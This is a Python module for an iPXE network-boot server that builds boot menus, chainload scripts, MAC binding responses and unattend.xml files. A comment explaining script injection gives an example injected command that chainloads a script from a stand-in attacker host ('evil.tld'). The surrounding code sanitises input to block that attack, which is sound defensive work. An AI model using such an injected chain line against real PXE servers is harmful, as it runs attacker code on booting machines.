#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import re
import ipaddress
from urllib.parse import unquote, urlencode
from xml.sax.saxutils import escape as _xml_escape
import configparser

# 模块配置，由主程序初始化
_SERVER_CONFIG = {}
_CLIENT_MANAGER = None

# =======================[ 输入消毒（防 iPXE 脚本注入） ]=======================
# 背景：dynamic.ipxe 会把 URL 参数直接拼进 iPXE 脚本。
# iPXE 以“行”为单位解析脚本，因此任何 CR/LF 都会让攻击者插入新的命令行
# （例如 chain http://evil.tld/pwn.ipxe），从而在 PXE 客户端上执行任意代码。
_CONTROL_CHARS_RE = re.compile(r"[\x00-\x1f\x7f]")
_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}([-:][0-9A-Fa-f]{2}){5}$")

def _sanitize_ipxe_value(value, max_len=255):
    """移除换行与控制字符并截断长度，确保单个值不会跨行注入新的 iPXE 命令。"""
    if value is None:
        return ""
    return _CONTROL_CHARS_RE.sub("", str(value))[:max_len].strip()

def _is_valid_ip(value):
    try:
        ipaddress.ip_address(value)
        return True
    except (ValueError, TypeError):
        return False

# 定义所有支持扫描的启动文件扩展名
SUPPORTED_EXTENSIONS = {'.wim', '.iso', '.efi', '.vhd', '.vhdx', '.vmdk', '.dsk', '.ima', '.img', '.ramos', '.iqn'}

# =======================[ iPXE全局设置头 ]=======================
# This block of iPXE script will be prepended to all dynamic file boot requests.
# It sets up the environment for your iPXEFM menu system.
IPXEFM_GLOBAL_SETTINGS_HEADER = """#!ipxe

##############中级止步!高级秃顶用户修改区域######
#修改iscsi server的地址(默认是next-server)
#set iscsiurl 169.254.1.1
#修改本菜单的名称(默认是/ipxeboot.txt)
set scriptfile /ipxeboot.txt
#修改默认启动的文件类型(wim iso img)
set ext-default wim
#修改各类型默认启动的文件序号(0-9)
set wimbootfile-default 1
set isobootfile-default 2
set imgbootfile-default 1
set vhdbootfile-default 1
set iqnbootfile-default 1
set ramosbootfile-default 1
#设置wim启动默认方式
set pcbioswimbootmode wimboot #(不注入文件)
#set pcbioswimbootmode startup.bat #(注入默认的startup.bat文件)
set efiwimbootmode wimboot
#set efiwimbootmode  startup.bat #(注入默认的startup.bat文件)

#设置iso启动默认方式
set pcbiosisobootmode pcbiosisowithmemdisk #其它方式有isowithgrub isowithmemdisk pcbiosisowithsanboot
set efiisobootmode efiisowithimgboot #其它方式有efiisowithgrubmemrt efiisowithimgboot efiisowithgrub efiisowithsanboot

#设置img启动默认方式
set pcbiosimgbootmode memdiskimg #其它方式有pcbiossanbootimg pcbiosbootimgfdd pcbiosbootimghdd imgwithimgboot memdiskimg
set efiimgbootmode efibootimg #方式有其它efisanbootimg efibootimg
 
#设置vhd启动默认方式
set pcbiosvhdbootmode ${platform}sanbootvhd
set efivhdbootmode ${platform}sanbootvhd

#设置IQN启动默认方式
set pcbiosiqnbootmode ${platform}bootpe
set efiiqnbootmode ${platform}install

#设置ramos[ramos]启动默认方式
set pcbiosramosbootmode ${platform}ramos
set efiramosbootmode ${platform}ramos

set ext-timeout 8000
set bootfile-timeout 8000
##########
#设置分辨率图片                           
isset ${x} || set x 800   
isset ${y} || set y 600     
isset ${bg} || set bg 800x600.png        
isset ${ld} || set ld loading.png                              
set prefix /Boot/ipxefm
set themes http://${booturl}/Boot/ipxefm/themes/jnygc
set quiet 1 #静默启动，1打开，注释掉不打开
console --x ${x} -y ${y} ||
console --picture ${themes}/${bg} --left 32 --right 32 --top 32 --bottom 48 ||
"""

# =======================[ 扩展名到类型脚本的映射 ]=======================
CHAINLOAD_MAP = {
    '.wim': 'wim',
    '.iso': 'iso',
    '.img': 'img',
    '.ima': 'img',
    '.efi': 'efi', # 增加了对 .efi 的直接处理
    '.vhd': 'disk',
    '.vhdx': 'disk',
    '.vmdk': 'disk',
    '.dsk': 'disk',
    '.ramos': 'ramos',
    '.iqn': 'iqn'
}


def initialize_dynamic_scripting(settings: dict, client_manager_instance=None):
    """
    从主服务器接收配置和 ClientManager 实例并初始化本模块。
    """
    global _SERVER_CONFIG, _CLIENT_MANAGER
    # 复制所有设置，以便我们可以访问PXE菜单配置
    _SERVER_CONFIG = settings.copy()
    _SERVER_CONFIG['http_uri'] = f"http://{settings.get('server_ip', '127.0.0.1')}:{settings.get('http_port', 80)}"
    _SERVER_CONFIG['boot_url'] = f"{settings.get('server_ip', '127.0.0.1')}:{settings.get('http_port', 80)}"
    _CLIENT_MANAGER = client_manager_instance

    log_msg = f"Dynamic scripting module updated. HTTP URI: {_SERVER_CONFIG['http_uri']}"
    if _CLIENT_MANAGER:
        log_msg += " | ClientManager instance linked."
    print(log_msg)


# =======================[ 通用Chainload脚本生成器 ]=======================
def _generate_chainload_script(bootfile_path: str, type_name: str) -> str:
    """
    生成一个iPXE脚本片段，该脚本设置一个包含文件路径的变量，
    然后链式加载到特定类型的处理脚本。
    """
    if not bootfile_path.startswith('/'):
        bootfile_path = '/' + bootfile_path
    
    # 对于 .efi 文件，直接使用 chain 命令
    if type_name == 'efi':
        return f"""
chain http://${{booturl}}{bootfile_path} || goto failed
:failed
echo Failed to chainload EFI file!
sleep 5
chain http://${{booturl}}/dynamic.ipxe?bootfile=ipxefm
"""
    
    # 对其他文件类型使用标准处理脚本
    return f"""
set bootfile {bootfile_path}
chain http://${{booturl}}/Boot/ipxefm/types/{type_name} || goto failed
:failed
echo Failed to chainload type handler!
sleep 5
chain http://${{booturl}}/dynamic.ipxe?bootfile=ipxefm
"""

def _generate_whoami_menu(http_uri: str) -> str:
    """生成一个菜单，列出所有待分配MAC地址的客户端。"""
    if not _CLIENT_MANAGER:
        return "#!ipxe\necho Server Error: ClientManager not initialized.\nshell"

    unassigned_clients = _CLIENT_MANAGER.get_unassigned_clients()

    if not unassigned_clients:
        return "#!ipxe\necho No unassigned clients found to claim.\nsleep 3\nsanboot --no-describe --drive 0x80"
    
    script = [
        "#!ipxe",
        "",
        "menu Please identify this machine",
    ]
    
    for client in unassigned_clients:
        safe_name = _sanitize_ipxe_value(client['name'], 64) or "unknown"
        safe_ip = _sanitize_ipxe_value(client['ip'], 64)
        script.append(f"item {safe_ip} {safe_name} --- {safe_ip}")
    
    script.extend([
        "",
        "choose --timeout 30000 selected || exit",
        f"chain {http_uri}/dynamic.ipxe?myip=${{selected}}&mymac=${{net0/mac}}",
        "exit"
    ])
    
    return "\n".join(script)


def _perform_mac_binding(ip: str, mac: str) -> str:
    """执行MAC地址和IP的绑定操作。"""
    if not _CLIENT_MANAGER:
        return "#!ipxe\necho Server Error: ClientManager not initialized.\nshell"

    mac_norm = mac.upper().replace(':', '-')
    success = _CLIENT_MANAGER.assign_mac_to_ip(ip, mac_norm)

    if success:
        return (
            "#!ipxe\n"
            f"echo Successfully bound this machine ({mac_norm}) to IP {ip}.\n"
            "echo Rebooting in 5 seconds...\n"
            "sleep 5\n"
            "reboot"
        )
    else:
        return (
            "#!ipxe\n"
            f"echo ERROR: Failed to bind MAC {mac_norm} to IP {ip}.\n"
            "echo Please check server logs.\n"
            "sleep 10\n"
            "shell"
        )


def _generate_all_files_menu(http_uri: str) -> str:
    """扫描HTTP目录并生成一个包含所有可启动文件的菜单。"""
    http_root = _SERVER_CONFIG.get('http_root')
    if not http_root or not os.path.isdir(http_root):
        return "#!ipxe\necho Server Error: HTTP root directory not configured or not found.\nshell"

    boot_files = []
    for root, _, files in os.walk(http_root):
        for file in files:
            if os.path.splitext(file)[1].lower() in SUPPORTED_EXTENSIONS:
                full_path = os.path.join(root, file)
                relative_path = os.path.relpath(full_path, http_root)
                # 统一使用 / 作为路径分隔符，兼容所有系统
                web_path = relative_path.replace(os.sep, '/')
                boot_files.append(web_path)
    
    if not boot_files:
        return "#!ipxe\necho No bootable files found in the HTTP directory.\nsleep 5\nsanboot --no-describe --drive 0x80"

    script = [
        "#!ipxe",
        "",
        "menu All Bootable Files",
        "item --gap -- Select a file to boot",
    ]

    boot_files.sort()
    for path in boot_files:
        safe_path = _sanitize_ipxe_value(path, 200)
        # 使用引号包围 item name，以支持带空格的文件名
        script.append(f"item \"{safe_path}\" \"{safe_path}\"")

    script.extend([
        "",
        "choose --timeout 30000 selected || exit",
        # 使用 :uristring 来确保 ${selected} 的值被正确地URL编码
        f"chain {http_uri}/dynamic.ipxe?bootfile=${{selected:uristring}}",
        "exit"
    ])

    return "\n".join(script)

# =======================[ 新增：iPXE菜单生成器 ]=======================
def _generate_ipxe_menu_from_config() -> str:
    """
    读取 [PXEMenuIPXE] 配置并生成一个动态的 iPXE 脚本菜单。
    """
    if not _SERVER_CONFIG.get('pxe_menu_ipxe_enabled', False):
        return "#!ipxe\necho iPXE menu is disabled on the server.\nsanboot --no-describe --drive 0x80"

    prompt = _SERVER_CONFIG.get('pxe_menu_ipxe_prompt', 'iPXE Boot Menu')
    # iPXE 的超时单位是毫秒
    timeout_ms = _SERVER_CONFIG.get('pxe_menu_ipxe_timeout', 6) * 1000
    items_str = _SERVER_CONFIG.get('pxe_menu_ipxe_items', '')
    http_uri = _SERVER_CONFIG.get('http_uri', 'http://127.0.0.1')
    
    script = ["#!ipxe", "", f"menu {prompt}"]
    
    item_actions = {}
    item_counter = 0

    for line in items_str.strip().splitlines():
        line = line.strip()
        if not line or line.startswith(';'):
            continue
        
        parts = [p.strip() for p in line.split(',', 3)]
        if len(parts) == 4:
            menu_text, boot_file, _, _ = parts
            item_name = f"item_{item_counter}"
            item_counter += 1
            
            script.append(f"item {item_name} {_sanitize_ipxe_value(menu_text, 100)}")

            action = ""
            if not boot_file or boot_file.strip() == "":
                action = "sanboot --no-describe --drive 0x80"
            elif '%dynamicboot%' in boot_file:
                # 示例: %dynamicboot%=/newbeeplus.wim
                # 转换成: chain http://server/dynamic.ipxe?bootfile=/newbeeplus.wim
                action_param = boot_file.split('=', 1)[1]
                # 对参数进行URL编码以支持特殊字符
                encoded_param = urlencode({'bootfile': action_param})
                action = f"chain {http_uri}/dynamic.ipxe?{encoded_param}"
            elif boot_file.startswith(('http://', 'https://')):
                action = f"chain {boot_file}"
            else:
                # 假定为本地HTTP服务器上的常规文件
                # 使用 :uristring 进行编码，确保文件名中的空格等特殊字符被正确处理
                action = f"chain {http_uri}/{boot_file.lstrip('/')}"
            
            item_actions[item_name] = action

    script.append(f"choose --timeout {timeout_ms} selected || exit")
    
    # 使用 goto 跳转到选择的项对应的标签
    script.append("goto ${selected}")
    script.append("")

    for name, action in item_actions.items():
        script.append(f":{name}")
        script.append(f"{action} ||") # 如果命令失败，则允许脚本继续
        script.append("goto MENU_END") # 执行完后跳出
        script.append("")

    script.append(":MENU_END")
    script.append("exit")
    
    return "\n".join(script)

def _generate_client_info_script(client_ip: str) -> str:
    """
    生成一个有效的 iPXE 脚本，该脚本使用客户端的网络和身份信息设置变量。
    """
    info = {
        'pcname': '', 'ip': client_ip, 'mask': _SERVER_CONFIG.get('subnet_mask', ''),
        'gateway': _SERVER_CONFIG.get('router_ip', ''), 'dns1': '', 'dns2': '', 'mac': ''
    }
    dns_servers = _SERVER_CONFIG.get('dns_server_ip', '').replace(' ', '').split(',')
    if len(dns_servers) > 0 and dns_servers[0]: info['dns1'] = dns_servers[0]
    if len(dns_servers) > 1 and dns_servers[1]: info['dns2'] = dns_servers[1]
    
    mac_address = _CLIENT_MANAGER.ip_to_mac.get(client_ip) if _CLIENT_MANAGER else None
    
    if mac_address:
        mac_norm = mac_address.upper().replace(':', '-')
        info['mac'] = mac_norm
        CONFIG_INI_FILENAME = 'ipxefm_cli.ini'
        if os.path.exists(CONFIG_INI_FILENAME):
            config = configparser.ConfigParser(interpolation=None)
            try:
                config.read(CONFIG_INI_FILENAME, encoding='utf-8')
                if config.has_section(mac_norm):
                    info['pcname'] = config.get(mac_norm, 'name', fallback='')
            except Exception: pass

    # 注意：pcname 来自 ipxefm_cli.ini（可能被 TFTP 上传覆盖），必须消毒后再注入脚本
    safe_values = {k: _sanitize_ipxe_value(v, 64) for k, v in info.items()}
    script = [
        "#!ipxe", "rem Predefined information about this machine",
        f"set pcname {safe_values['pcname']}", f"set ip {safe_values['ip']}", f"set mask {safe_values['mask']}",
        f"set gateway {safe_values['gateway']}", f"set dns1 {safe_values['dns1']}",
        f"set dns2 {safe_values['dns2']}", f"set mac {safe_values['mac']}",
    ]
    return "\n".join(script)


def _generate_unattend_xml(client_ip: str) -> str:
    """
    根据客户端IP从客户列表中获取计算机名，生成一个简单的unattend.xml文件内容。
    """
    computer_name = ""
    mac_address = _CLIENT_MANAGER.ip_to_mac.get(client_ip) if _CLIENT_MANAGER else None
    
    if mac_address:
        mac_norm = mac_address.upper().replace(':', '-')
        CONFIG_INI_FILENAME = 'ipxefm_cli.ini'
        if os.path.exists(CONFIG_INI_FILENAME):
            config = configparser.ConfigParser(interpolation=None)
            try:
                config.read(CONFIG_INI_FILENAME, encoding='utf-8')
                if config.has_section(mac_norm):
                    computer_name = config.get(mac_norm, 'name', fallback='')
            except Exception as e:
                print(f"Error reading {CONFIG_INI_FILENAME} for {mac_norm}: {e}")
                pass
    
    return f"""<?xml version="1.0" encoding="utf-8"?>    
<unattend xmlns="urn:schemas-microsoft-com:unattend">    
    <settings pass="windowsPE">    
        <component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">    
            <ComputerName>{_xml_escape(computer_name)}</ComputerName> 
            <EnableNetwork>true</EnableNetwork>    
            <EnableFirewall>false</EnableFirewall>    
        </component>    
    </settings>    
</unattend>
"""


def generate_dynamic_script(params: dict, client_ip: str) -> str:
    """
    主生成函数。根据 URL 参数决定生成哪种脚本。
    """
    http_uri = _SERVER_CONFIG.get('http_uri', 'http://127.0.0.1')
    
    # 1. 优先处理绑定请求 (返回完整脚本)
    if 'myip' in params and 'mymac' in params:
        ip_to_bind = _sanitize_ipxe_value(params['myip'][0], 64)
        mac_to_bind = _sanitize_ipxe_value(params['mymac'][0], 64)
        # 严格校验，避免非法内容被回显到 iPXE 脚本中
        if not _is_valid_ip(ip_to_bind) or not _MAC_RE.match(mac_to_bind):
            return "#!ipxe\necho Invalid bind parameters (ip/mac rejected).\nsleep 3\nexit"
        return _perform_mac_binding(ip_to_bind, mac_to_bind)

    # 2. 其次处理 bootfile 参数
    bootfile = params.get('bootfile', [None])[0]
    if bootfile:
        bootfile = _sanitize_ipxe_value(unquote(bootfile).strip('"'), 255)
        
        # 2a. 特殊功能关键字 (返回完整脚本)
        if bootfile.lower() == 'ipxemenu':
            return _generate_ipxe_menu_from_config()
        if bootfile.lower() == 'getmyxml':
            return _generate_unattend_xml(client_ip)
        if bootfile.lower() == 'getmyip':
            return _generate_client_info_script(client_ip)
        if bootfile.lower() == 'whoami':
            return _generate_whoami_menu(http_uri)
        if bootfile.lower() == 'ipxefm':
            return _generate_all_files_menu(http_uri)
        
        # 2b. 处理常规文件引导
        file_ext = os.path.splitext(bootfile)[1].lower()
        type_name = CHAINLOAD_MAP.get(file_ext)

        if type_name:
            boot_url_value = _SERVER_CONFIG.get('boot_url', '127.0.0.1:80')
            chain_script = _generate_chainload_script(bootfile, type_name)
            header_body = IPXEFM_GLOBAL_SETTINGS_HEADER.lstrip("#!ipxe").strip()
            
            final_script = (
                "#!ipxe\n"
                f"set booturl {boot_url_value}\n"
                f"{header_body}\n"
                f"{chain_script}"
            )
            return final_script
        else:
            # 如果文件类型不支持，返回一个错误提示脚本
            return f"#!ipxe\necho Unsupported file type: {bootfile}\nsleep 5\nchain {http_uri}/dynamic.ipxe?bootfile=ipxefm"
    
    # 3. 如果没有 bootfile 参数，默认显示 'ipxefm' 菜单 (返回完整脚本)
    return _generate_all_files_menu(http_uri)